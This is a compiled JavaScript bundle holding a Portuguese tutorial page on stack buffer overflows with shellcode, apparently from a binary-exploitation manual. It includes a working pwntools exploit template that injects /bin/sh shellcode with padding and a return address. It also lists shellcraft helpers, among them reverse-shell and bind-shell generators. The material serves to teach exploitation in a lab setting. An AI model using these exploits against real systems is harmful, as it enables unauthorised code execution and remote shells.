"use strict";(globalThis.webpackChunkmanual_pwning_docs=globalThis.webpackChunkmanual_pwning_docs||[]).push([[10],{8024(e,o,n){n.r(o),n.d(o,{assets:()=>i,contentTitle:()=>d,default:()=>p,frontMatter:()=>l,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"pwning/bof/2-3-bof-shellcode","title":"Buffer Overflow - Shellcode","description":"Shell Code \xe9 um pequeno trecho de c\xf3digo em Assembly usado como payload (carga \xfatil) em um ataque. O c\xf3digo \xe9 muito pequeno por ser em assembly, portanto apenas poucos bytes s\xe3o necess\xe1rios, dependendo do shellcode.","source":"@site/docs/pwning/bof/2-3-bof-shellcode.md","sourceDirName":"pwning/bof","slug":"/pwning/bof/2-3-bof-shellcode","permalink":"/manual-pwning/docs/pwning/bof/2-3-bof-shellcode","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":5,"frontMatter":{"title":"Buffer Overflow - Shellcode","sidebar_position":5},"sidebar":"tutorialSidebar","previous":{"title":"Buffer Overflow - Return Address","permalink":"/manual-pwning/docs/pwning/bof/2-2-bof-callfunction"},"next":{"title":"Format Strings","permalink":"/manual-pwning/docs/pwning/format-strings"}}');var r=n(4848),a=n(8453);const l={title:"Buffer Overflow - Shellcode",sidebar_position:5},d=void 0,i={},c=[{value:"Inimigos do Shellcode: PIE e DEP",id:"inimigos-do-shellcode-pie-e-dep",level:3},{value:"Usando BOF Shellcode",id:"usando-bof-shellcode",level:3},{value:"ShellCode + pwntools",id:"shellcode--pwntools",level:3}];function t(e){const o={code:"code",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)(o.p,{children:["Shell Code \xe9 um ",(0,r.jsx)(o.strong,{children:"pequeno trecho de c\xf3digo em Assembly usado como payload (carga \xfatil) em um ataque"}),". O c\xf3digo \xe9 muito pequeno por ser em assembly, portanto apenas poucos bytes s\xe3o necess\xe1rios, dependendo do shellcode."]}),"\n",(0,r.jsxs)(o.p,{children:["Com shellcode, ",(0,r.jsx)(o.strong,{children:"fazemos o programa rodar funcionalidades que o programador n\xe3o escreveu"}),". Normalmente, shellcode \xe9 utilizado para fazer uma chamada de API do Windows ou Syscall no Linux."]}),"\n",(0,r.jsx)(o.p,{children:"No C, estar\xedamos fazendo algo como:"}),"\n",(0,r.jsx)(o.pre,{children:(0,r.jsx)(o.code,{className:"language-C",children:'int main() {\r\n    system("/bin/sh"); // Chama shell\r\n    return 0;\r\n}\n'})}),"\n",(0,r.jsxs)(o.p,{children:["O Shellcode \xe9 a vers\xe3o compacta disso, em assembly, que pode ser injetada na mem\xf3ria atrav\xe9s de um input. Ou seja, ",(0,r.jsx)(o.strong,{children:"Shellcode \xe9 c\xf3digo Assembly normal"}),", nada especial."]}),"\n",(0,r.jsxs)(o.p,{children:["A raz\xe3o pela qual Shellcode possui sucesso \xe9 por que ",(0,r.jsx)(o.strong,{children:"o computador n\xe3o diferencia dados e instru\xe7\xf5es"}),". N\xe3o importa onde ou como voc\xea fala para rodar, o computador VAI tentar rodar. Assim, mesmo que nosso input seja apenas dados, o computador n\xe3o sabe disso."]}),"\n",(0,r.jsx)(o.h3,{id:"inimigos-do-shellcode-pie-e-dep",children:"Inimigos do Shellcode: PIE e DEP"}),"\n",(0,r.jsx)(o.p,{children:"PIE (Position-Independent Executables) \xe9 uma t\xe9cnica de seguran\xe7a que randomiza a mem\xf3ria do programa. Para realizar shellcode, precisamos saber exatamente o que vamos fazer. O PIE pode ser burlado se voc\xea conseguir vazar os endere\xe7os de mem\xf3ria que precisa, mas isso n\xe3o vem ao caso agora."}),"\n",(0,r.jsx)(o.p,{children:"A outra prote\xe7\xe3o \xe9 o DEP (Data Execution Prevention). Esse \xe9 mais mortal, pois impede que \xe1reas da mem\xf3ria que deveriam conter apenas dados (stack, heap) sejam executadas como c\xf3digo. O que contorna isso s\xe3o os ataques de ROP. Ou seja, nada de injetar c\xf3digo novo, s\xf3 podemos reaproveitar o que j\xe1 existe no c\xf3digo."}),"\n",(0,r.jsx)(o.h3,{id:"usando-bof-shellcode",children:"Usando BOF Shellcode"}),"\n",(0,r.jsx)(o.p,{children:"Basicamente:"}),"\n",(0,r.jsxs)(o.ol,{children:["\n",(0,r.jsx)(o.li,{children:"Identifique se \xe9 poss\xedvel fazer BOF"}),"\n",(0,r.jsxs)(o.li,{children:["Coloque o ",(0,r.jsx)(o.strong,{children:"Shellcode no Input"})," + ",(0,r.jsxs)(o.strong,{children:["Padding at\xe9 ",(0,r.jsx)(o.code,{children:"return address"})]})," + ",(0,r.jsx)(o.strong,{children:"Endere\xe7o do in\xedcio do Shellcode na stack"})]}),"\n",(0,r.jsxs)(o.li,{children:["Sim, acabamos de mandar o ",(0,r.jsx)(o.code,{children:"RIP"})," executar instru\xe7\xe3o na stack."]}),"\n"]}),"\n",(0,r.jsxs)(o.p,{children:["Exemplo com pwntools, abrindo uma shell (",(0,r.jsx)(o.code,{children:"shellcraft.sh()"}),"):"]}),"\n",(0,r.jsx)(o.pre,{children:(0,r.jsx)(o.code,{className:"language-py",children:"from pwn import *\r\n\r\ncontext.binary = ELF('./program')\r\n\r\np = process()\r\n\r\npayload = asm(shellcraft.sh())          # Shellcode\r\npayload = payload.ljust(312, b'A')      # Padding\r\npayload += p32(0xffffcfb4)              # Endere\xe7o do Shellcode\r\n\r\nlog.info(p.clean())\r\n\r\np.sendline(payload)\r\n\r\np.interactive()\n"})}),"\n",(0,r.jsx)(o.h3,{id:"shellcode--pwntools",children:"ShellCode + pwntools"}),"\n",(0,r.jsx)(o.pre,{children:(0,r.jsx)(o.code,{className:"language-py",children:"# Shellcodes prontos populares\r\nshellcraft.sh()           # /bin/sh\r\nshellcraft.cat('file')    # cat file\r\nshellcraft.dupsh()        # Duplica shell para fd\r\nshellcraft.echo('text')   # Imprime texto\r\nshellcraft.exit()         # Sai do processo\r\nshellcraft.findpeersh()   # Encontra peer shell\r\n\r\n# Redes\r\nshellcraft.connect('ip', port)\r\nshellcraft.bindsh(port)\r\nshellcraft.reverse('ip', port)\r\n\r\n# Sistema de arquivos\r\nshellcraft.getdents(fd)\r\nshellcraft.getcwd()\n"})}),"\n",(0,r.jsx)(o.p,{children:"Exemplo:"}),"\n",(0,r.jsx)(o.pre,{children:(0,r.jsx)(o.code,{className:"language-py",children:'#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\n# Configurar\r\ncontext.binary = ELF(\'./program\')\r\n\r\np = process()\r\n\r\nprint("Gerando shellcode /bin/sh...")\r\n\r\n# Gerar shellcode\r\nshellcode = asm(shellcraft.sh())\r\n\r\nprint(f"Shellcode: {len(shellcode)} bytes")\r\nprint(hexdump(shellcode))\r\n\r\n# Disassemblar para ver as instru\xe7\xf5es\r\nprint("\\\\nInstru\xe7\xf5es Assembly:")\r\nprint(disasm(shellcode))\r\n\r\n# Testar (opcional - descomente para executar)\r\n# print("\\\\n\ud83d\ude80 Executando shellcode...")\r\n# p = run_shellcode(shellcode)\r\n# p.interactive()\n'})})]})}function p(e={}){const{wrapper:o}={...(0,a.R)(),...e.components};return o?(0,r.jsx)(o,{...e,children:(0,r.jsx)(t,{...e})}):t(e)}},8453(e,o,n){n.d(o,{R:()=>l,x:()=>d});var s=n(6540);const r={},a=s.createContext(r);function l(e){const o=s.useContext(a);return s.useMemo(function(){return"function"==typeof e?e(o):{...o,...e}},[o,e])}function d(e){let o;return o=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:l(e.components),s.createElement(a.Provider,{value:o},e.children)}}}]);